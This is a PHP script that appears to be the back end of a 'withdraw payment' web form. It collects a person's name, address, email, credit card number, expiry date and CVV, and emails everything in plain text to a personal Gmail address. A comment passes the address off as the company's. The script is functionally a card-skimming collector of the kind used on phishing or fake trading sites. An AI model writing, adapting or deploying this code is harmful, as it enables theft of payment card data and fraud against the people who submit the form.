<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Collect and sanitize form data
    $fullName = sanitizeInput($_POST['full_name']);
    $email = sanitizeInput($_POST['email']);
    $address = sanitizeInput($_POST['address']);
    $city = sanitizeInput($_POST['city']);
    $state = sanitizeInput($_POST['state']);
    $zipCode = sanitizeInput($_POST['zip_code']);
    $nameOnCard = sanitizeInput($_POST['name_on_card']);
    $creditCardNumber = sanitizeInput($_POST['credit_card_number']);
    $expMonth = sanitizeInput($_POST['exp_month']);
    $expYear = sanitizeInput($_POST['exp_year']);
    $cvv = sanitizeInput($_POST['cvv']);

    // Validate form data
    if (empty($fullName) || empty($email) || empty($address) || empty($city) || empty($state) || empty($zipCode) || empty($nameOnCard) || empty($creditCardNumber) || empty($expMonth) || empty($expYear) || empty($cvv)) {
        echo 'Please fill in all the required fields.';
        exit;
    }

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo 'Invalid email address.';
        exit;
    }

    // Compose the email message
    $to = 'trademoney116@gmail.com'; // Replace with the company's email address
    $subject = 'Withdraw Payment Details';
    $message = "Full Name: $fullName\n"
        . "Email: $email\n"
        . "Address: $address\n"
        . "City: $city\n"
        . "State: $state\n"
        . "Zip Code: $zipCode\n"
        . "Name on Card: $nameOnCard\n"
        . "Credit Card Number: $creditCardNumber\n"
        . "Expiration Month: $expMonth\n"
        . "Expiration Year: $expYear\n"
        . "CVV: $cvv";

    // Send the email
    $headers = "From: $email\r\n";
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to success page
        header('Location: success.html');
        exit;
    } else {
        echo 'Failed to send email.';
    }
}

// Function to sanitize user input
function sanitizeInput($input) {
    $input = trim($input);
    $input = stripslashes($input);
    $input = htmlspecialchars($input);
    return $input;
}
?>
